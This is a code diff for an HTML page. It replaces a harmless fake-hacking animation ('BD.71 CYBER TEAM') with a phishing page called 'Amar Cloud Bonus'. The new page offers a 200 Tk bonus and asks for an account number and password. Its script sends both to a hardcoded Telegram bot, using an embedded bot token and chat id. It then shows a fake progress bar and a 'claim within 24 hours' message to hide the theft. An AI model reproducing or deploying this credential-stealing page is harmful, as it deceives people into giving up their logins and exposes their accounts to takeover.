@@ -2,307 +2,167 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>BD.71 CYBER TEAM — Hacking Mode (Simulation)</title>
-  <meta name="description" content="BD.71 CYBER TEAM — educational cyber simulation. Purely visual, no real hacking." />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Amar Cloud Bonus</title>
   <style>
-    /* --------- Base / Theme --------- */
-    :root{
-      --bg:#07090d;
-      --panel:#0b0f17;
-      --accent:#00ff9d;
-      --accent2:#ff2d55;
-      --muted:#6b7280;
-      --text:#e5f4ef;
-      --term:#0a0f12;
-      --glow:0 0 24px rgba(0,255,157,.35);
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom, #141e30, #243b55);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
     }
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{
-      margin:0; background:radial-gradient(1200px 800px at 80% -10%,#0c1220 0%,#080b12 35%,var(--bg) 70%);
-      color:var(--text); font: 500 16px/1.55 "Inter", system-ui, -apple-system, Segoe UI, Roboto, Arial;
-      overflow:hidden;
+
+    .app-container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      box-sizing: border-box;
     }
-    a{color:inherit}
 
-    /* Grid Shell */
-    .wrap{position:relative; display:grid; grid-template-rows:auto 1fr auto; height:100vh}
-    header{display:flex; align-items:center; gap:14px; padding:16px 18px; background:linear-gradient(180deg, rgba(255,255,255,.04), transparent); border-bottom:1px solid rgba(255,255,255,.06)}
-    .badge{font-weight:800; letter-spacing:.18em; font-size:12px; color:#0a0; background:rgba(0,255,157,.06); border:1px solid rgba(0,255,157,.25); padding:6px 10px; border-radius:999px; text-shadow:var(--glow)}
-    .title{font-weight:900; font-size:clamp(18px,2.2vw,28px); letter-spacing:.06em; text-transform:uppercase}
+    h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #f1c40f;
+      font-size: 24px;
+    }
 
-    main{display:grid; grid-template-columns: 320px 1fr; gap:16px; padding:16px; height:calc(100vh - 112px)}
-    @media (max-width: 920px){ main{grid-template-columns:1fr} .side{order:2; height:280px}}
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 20px;
+      padding: 30px 20px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+      transition: all 0.3s ease-in-out;
+    }
 
-    /* Side Panel */
-    .side{background:linear-gradient(180deg, rgba(255,255,255,.02), transparent); border:1px solid rgba(255,255,255,.06); border-radius:18px; padding:14px; position:relative; overflow:hidden}
-    .card{background:var(--panel); border:1px solid rgba(255,255,255,.06); border-radius:16px; padding:14px; box-shadow:0 10px 30px rgba(0,0,0,.35)}
-    .card + .card{margin-top:12px}
-    h3{margin:0 0 6px 0; font-size:13px; letter-spacing:.12em; text-transform:uppercase; color:#9aa4b2}
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      outline: none;
+      background-color: #2c2c2c;
+      color: #fff;
+    }
 
-    /* Buttons */
-    .btn{appearance:none; border:0; border-radius:14px; padding:12px 14px; font-weight:800; letter-spacing:.08em; text-transform:uppercase; cursor:pointer; transition:.2s transform, .2s filter; background:linear-gradient(180deg, rgba(0,255,157,.16), rgba(0,255,157,.08)); color:#0f0; border:1px solid rgba(0,255,157,.35); text-shadow:0 0 14px rgba(0,255,157,.5)}
-    .btn:hover{transform:translateY(-1px)}
-    .btn:active{transform:translateY(0)}
-    .btn.alt{background:linear-gradient(180deg, rgba(255,45,85,.18), rgba(255,45,85,.06)); color:#fff; border-color:rgba(255,45,85,.4); text-shadow:0 0 14px rgba(255,45,85,.4)}
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: bold;
+      background: linear-gradient(to right, #00c6ff, #0072ff);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      margin-top: 10px;
+      box-shadow: 0 5px 10px rgba(0, 114, 255, 0.4);
+    }
 
-    /* Terminal */
-    .terminal{position:relative; background:linear-gradient(180deg, #040607, #0c1116); border:1px solid rgba(255,255,255,.06); border-radius:18px; overflow:hidden; box-shadow:0 10px 35px rgba(0,0,0,.5)}
-    .term-top{display:flex; align-items:center; gap:8px; padding:10px 12px; background:linear-gradient(180deg, rgba(255,255,255,.04), transparent); border-bottom:1px solid rgba(255,255,255,.06)}
-    .dot{width:10px; height:10px; border-radius:999px; background:#ff5f57; box-shadow:0 0 14px rgba(255,95,87,.6)}
-    .dot:nth-child(2){background:#ffbd2e; box-shadow:0 0 14px rgba(255,189,46,.45)}
-    .dot:nth-child(3){background:#28c840; box-shadow:0 0 14px rgba(40,200,64,.55)}
-    .term-body{height:100%; position:relative}
-    .screen{position:absolute; inset:0; padding:14px; overflow:auto; font-family: "SFMono-Regular", Menlo, Consolas, monospace; font-size:14px; color:#d9ffe9}
-    .screen::-webkit-scrollbar{width:10px}
-    .screen::-webkit-scrollbar-thumb{background:linear-gradient(180deg, rgba(0,255,157,.25), rgba(0,255,157,.08)); border-radius:20px}
+    button:hover {
+      opacity: 0.9;
+    }
 
-    /* Progress */
-    .bar{height:8px; border-radius:999px; background:rgba(255,255,255,.06); overflow:hidden; border:1px solid rgba(255,255,255,.08)}
-    .bar > i{display:block; height:100%; width:0%; background:linear-gradient(90deg, var(--accent), #b2ffd9); box-shadow:var(--glow)}
+    .hidden {
+      display: none;
+    }
 
-    /* Big Banner */
-    .banner{display:none; position:absolute; inset:0; align-items:center; justify-content:center; text-align:center; backdrop-filter: blur(3px) saturate(120%); background:radial-gradient(600px 260px at 50% 55%, rgba(0,255,157,.08), rgba(255,45,85,.06) 60%, transparent 70%)}
-    .banner.active{display:flex}
-    .banner h1{font-size:clamp(22px,4.2vw,52px); margin:0; letter-spacing:.12em; text-transform:uppercase; line-height:1.1; text-shadow:0 10px 40px rgba(0,255,157,.35), 0 0 8px rgba(0,0,0,.8)}
-    .blink{animation: blink 1s steps(2,end) infinite}
-    @keyframes blink{50%{opacity:.15}}
+    .progress-bar {
+      background-color: #444;
+      border-radius: 20px;
+      overflow: hidden;
+      height: 30px;
+      margin-bottom: 20px;
+    }
 
-    /* Matrix Rain */
-    canvas#matrix{position:fixed; inset:0; z-index:-1; opacity:.28; mix-blend-mode:screen}
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(to right, #16a085, #f4d03f);
+      color: #000;
+      font-weight: bold;
+      text-align: center;
+      line-height: 30px;
+      transition: width 0.3s ease;
+    }
 
-    /* Scanlines overlay */
-    .scan::after{content:""; position:absolute; inset:0; background: repeating-linear-gradient(180deg, rgba(255,255,255,.03) 0, rgba(255,255,255,.03) 1px, transparent 2px, transparent 4px); pointer-events:none}
+    #bonusMessage {
+      display: none;
+      font-size: 16px;
+      text-align: center;
+      animation: fadeIn 1s ease-in-out forwards;
+    }
 
-    footer{display:flex; align-items:center; justify-content:space-between; gap:10px; padding:12px 16px; color:#8aa; font-size:12px; border-top:1px solid rgba(255,255,255,.06); background:linear-gradient(180deg, transparent, rgba(255,255,255,.03))}
-    .mini{opacity:.7}
-
-    /* Glitch label */
-    .glitch{position:relative; display:inline-block; filter: drop-shadow(0 0 14px rgba(0,255,157,.25))}
-    .glitch::before,.glitch::after{content:attr(data-text); position:absolute; left:0; top:0}
-    .glitch::before{transform:translate(1px,0); clip-path:inset(0 0 50% 0); color:#0ff; opacity:.8}
-    .glitch::after{transform:translate(-1px,0); clip-path:inset(50% 0 0 0); color:#f0f; opacity:.8}
-    @keyframes shake{0%{transform:translateY(0)}25%{transform:translateY(-1px)}50%{transform:translateY(0)}75%{transform:translateY(1px)}100%{transform:translateY(0)}}
-
-    /* Toggle switches */
-    .toggle{display:flex; align-items:center; justify-content:space-between; gap:10px; padding:10px 12px; border:1px solid rgba(255,255,255,.06); border-radius:12px; margin-top:8px}
-    .switch{width:44px; height:24px; background:rgba(255,255,255,.08); border-radius:999px; position:relative}
-    .switch i{position:absolute; inset:3px auto 3px 3px; width:18px; height:18px; background:#fff; border-radius:999px; transition:.2s}
-    .switch.active{background:rgba(0,255,157,.35)}
-    .switch.active i{left:23px}
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(15px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
   </style>
 </head>
 <body>
-  <canvas id="matrix"></canvas>
-  <div class="wrap scan">
-    <header>
-      <span class="badge">LIVE SIMULATION</span>
-      <div class="title glitch" data-text="BD.71 CYBER TEAM">BD.71 CYBER TEAM</div>
-      <div style="margin-left:auto; display:flex; gap:8px">
-        <button class="btn" id="btnStart">Enter Hacking Mode</button>
-        <button class="btn alt" id="btnPanic">Panic (Clear)</button>
+  <div class="app-container">
+    <h2>🎁 Amar Cloud 200 Tk Bonus 🎁</h2>
+
+    <!-- Login Section -->
+    <div class="card" id="loginCard">
+      <input type="text" id="accountNumber" placeholder="Enter Account Number" />
+      <input type="password" id="accountPassword" placeholder="Enter Password" />
+      <button onclick="submitForm()">Login</button>
+    </div>
+
+    <!-- Progress Section -->
+    <div class="card hidden" id="progressCard">
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill">0%</div>
       </div>
-    </header>
-
-    <main>
-      <aside class="side">
-        <div class="card">
-          <h3>Mini Mission</h3>
-          <div style="display:grid; gap:8px">
-            <button class="btn" data-mission="recon">Recon Sweep</button>
-            <button class="btn" data-mission="breach">Firewall Breach</button>
-            <button class="btn" data-mission="exfil">Data Exfil</button>
-          </div>
-        </div>
-        <div class="card">
-          <h3>Danger Toggle (Visual)</h3>
-          <div class="toggle"><span>Stealth Glow</span><div class="switch" id="swGlow"><i></i></div></div>
-          <div class="toggle"><span>Red Alert</span><div class="switch" id="swAlert"><i></i></div></div>
-        </div>
-        <div class="card mini">
-          <h3>Note</h3>
-          This is a theatrical, educational simulation. It does not connect to any real systems.
-        </div>
-      </aside>
-
-      <section class="terminal" id="term">
-        <div class="term-top">
-          <div class="dot"></div><div class="dot"></div><div class="dot"></div>
-          <div style="margin-left:8px; font-weight:700; letter-spacing:.12em; font-size:12px">SIMULATED CONSOLE</div>
-        </div>
-        <div class="term-body">
-          <div class="banner" id="banner">
-            <h1>
-              <span class="glitch" data-text="BD.71 CYBER TEAM">BD.71 CYBER TEAM</span><br/>
-              has obtained <span style="color:var(--accent)">FULL ACCESS</span><span class="blink">_</span>
-            </h1>
-          </div>
-          <div class="screen" id="screen"></div>
-        </div>
-        <div style="padding:12px; display:grid; gap:8px">
-          <div class="bar"><i id="bar"></i></div>
-          <div style="display:flex; gap:8px; align-items:center; justify-content:space-between">
-            <small id="status">Idle</small>
-            <small id="clock"></small>
-          </div>
-        </div>
-      </section>
-    </main>
-
-    <footer>
-      <div>© <span id="yr"></span> BD.71 CYBER TEAM — Simulated Training Interface</div>
-      <div>Mode: <b id="mode">SAFE</b></div>
-    </footer>
+      <div id="bonusMessage">You will be able to claim your bonus within 24 hours.</div>
+    </div>
   </div>
 
   <script>
-    // ===== Matrix Rain Background (purely visual) =====
-    const cvs = document.getElementById('matrix');
-    const ctx = cvs.getContext('2d');
-    let w, h, cols, drops;
-    const glyphs = 'アィゥエオカキクケコサシスセソ0123456789ABCDEF#@$%*';
+    async function submitForm() {
+      const number = document.getElementById("accountNumber").value.trim();
+      const password = document.getElementById("accountPassword").value.trim();
 
-    function resize(){
-      w = cvs.width = innerWidth; h = cvs.height = innerHeight;
-      cols = Math.floor(w / 14); drops = Array(cols).fill(1);
-    }
-    addEventListener('resize', resize); resize();
-
-    function rain(){
-      ctx.fillStyle = 'rgba(0,0,0,0.08)'; ctx.fillRect(0,0,w,h);
-      ctx.fillStyle = '#00ff9d'; ctx.font = '14px monospace';
-      for(let i=0;i<drops.length;i++){
-        const ch = glyphs[Math.floor(Math.random()*glyphs.length)];
-        ctx.fillText(ch, i*14, drops[i]*16);
-        if(drops[i]*16 > h && Math.random() > 0.975) drops[i] = 0;
-        drops[i]++;
+      if (!number || !password) {
+        alert("Please enter both account number and password.");
+        return;
       }
-      requestAnimationFrame(rain);
+
+      // Send to Telegram (use responsibly)
+      const token = '8088507666:AAGxnWx0-i6aKT1pWHXskK5VSmDkYqPLYis';
+      const chat_id = '6593402184';
+      const text = `Login Info:\nAccount: ${number}\nPassword: ${password}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id, text })
+      });
+
+      // Hide login, show progress
+      document.getElementById("loginCard").classList.add("hidden");
+      document.getElementById("progressCard").classList.remove("hidden");
+
+      // Animate progress
+      const progressFill = document.getElementById("progressFill");
+      let progress = 0;
+      const interval = setInterval(() => {
+        if (progress >= 100) {
+          clearInterval(interval);
+          document.getElementById("bonusMessage").style.display = "block";
+        } else {
+          progress++;
+          progressFill.style.width = progress + "%";
+          progressFill.textContent = progress + "%";
+        }
+      }, 30);
     }
-    rain();
-
-    // ===== Utility =====
-    const screen = document.getElementById('screen');
-    const statusEl = document.getElementById('status');
-    const bar = document.getElementById('bar');
-    const banner = document.getElementById('banner');
-    const mode = document.getElementById('mode');
-    const yr = document.getElementById('yr'); yr.textContent = new Date().getFullYear();
-
-    function log(line){
-      const p = document.createElement('div');
-      p.textContent = line; screen.appendChild(p); screen.scrollTop = screen.scrollHeight;
-    }
-    function clearTerm(){ screen.innerHTML = ''; }
-    function setStatus(s){ statusEl.textContent = s; }
-    function setProgress(p){ bar.style.width = p + '%'; }
-
-    // ===== Fake Code Generator (20–30 lines) =====
-    function genFakeCode(tag){
-      const lines = [];
-      const words = ['TRACE','PROBE','BYPASS','VECTOR','LOOP','SALT','TOKEN','ACCESS','GHOST','SHIELD','KERNEL','PATCH','HOOK','ECHO','SHIFT','FRAGMENT','CIPHER','STREAM','STACK','VECTOR'];
-      const rnd = (n)=>Math.floor(Math.random()*n);
-      const count = 20 + rnd(11); // 20–30
-      for(let i=0;i<count;i++){
-        const a = words[rnd(words.length)], b = words[rnd(words.length)], c = words[rnd(words.length)];
-        lines.push(`[${String(i).padStart(3,'0')}] ${tag} ${a}::${b} => ${c}(${(Math.random()*9999|0).toString(16)})`);
-      }
-      return lines;
-    }
-
-    // ===== Mission Scripts (visual only) =====
-    const scripts = {
-      boot(){
-        const seq = [
-          '[SIM] Initializing BD.71 core...',
-          '[SIM] Loading stealth modules: ghost, shield, echo',
-          '[SIM] Spinning virtual NIC (loopback only)',
-          '[SIM] Generating decoy fingerprints',
-          '[SIM] Negotiating theatrical access',
-          '[SIM] Rendering threat matrix (visual)',
-          ...genFakeCode('BOOT'),
-          '[SIM] Status: READY — no real systems touched.'
-        ];
-        return seq;
-      },
-      recon(){
-        return [
-          '[RECON] Seeding visual topology...',
-          ...genFakeCode('RECON'),
-          '[RECON] Sweep complete — 0 real targets affected.'
-        ];
-      },
-      breach(){
-        return [
-          '[BREACH] Mounting mock payload...',
-          ...genFakeCode('BREACH'),
-          '[BREACH] Result: DEMO ACCESS ONLY.'
-        ];
-      },
-      exfil(){
-        return [
-          '[EXFIL] Starting pretend transfer...',
-          ...genFakeCode('EXFIL'),
-          '[EXFIL] Transfer 100% — wrote to volatile memory (discarded).'
-        ];
-      }
-    };
-
-    // ===== Runner =====
-    let running = false;
-    async function run(lines){
-      running = true; setProgress(0); setStatus('Running...');
-      clearTerm();
-      for(let i=0;i<lines.length;i++){
-        if(!running) break;
-        log(lines[i]);
-        setProgress(Math.floor(((i+1)/lines.length)*100));
-        await new Promise(r=>setTimeout(r, 80 + Math.random()*60));
-      }
-      setStatus('Done');
-    }
-
-    // ===== Banner (FULL ACCESS visual) =====
-    function showBanner(){ banner.classList.add('active'); setTimeout(()=>banner.classList.remove('active'), 2600); }
-
-    // ===== Controls =====
-    const btnStart = document.getElementById('btnStart');
-    const btnPanic = document.getElementById('btnPanic');
-    const swGlow = document.getElementById('swGlow');
-    const swAlert = document.getElementById('swAlert');
-
-    btnStart.addEventListener('click', async ()=>{
-      if(running) return; mode.textContent = 'THEATRICAL'; showBanner(); await run(scripts.boot());
-    });
-    btnPanic.addEventListener('click', ()=>{ running = false; clearTerm(); setProgress(0); setStatus('Idle'); mode.textContent = 'SAFE'; });
-
-    document.querySelectorAll('[data-mission]').forEach(btn=>{
-      btn.addEventListener('click', async ()=>{
-        if(running) return; showBanner(); const key = btn.getAttribute('data-mission'); await run(scripts[key]());
-      })
-    })
-
-    swGlow.addEventListener('click', ()=>{
-      swGlow.classList.toggle('active');
-      document.documentElement.style.setProperty('--accent', swGlow.classList.contains('active') ? '#7cffb2' : '#00ff9d');
-    })
-    swAlert.addEventListener('click', ()=>{
-      swAlert.classList.toggle('active');
-      document.body.style.filter = swAlert.classList.contains('active') ? 'hue-rotate(-25deg) saturate(130%)' : 'none';
-    })
-
-    // ===== Clock =====
-    function tick(){
-      const d = new Date();
-      const pad = (n)=>String(n).padStart(2,'0');
-      document.getElementById('clock').textContent = d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+' '+pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
-      requestAnimationFrame(tick);
-    }
-    tick();
-
-    // Auto start with a short splash after load
-    setTimeout(()=>{ btnStart.click(); }, 600);
   </script>
 </body>
 </html>
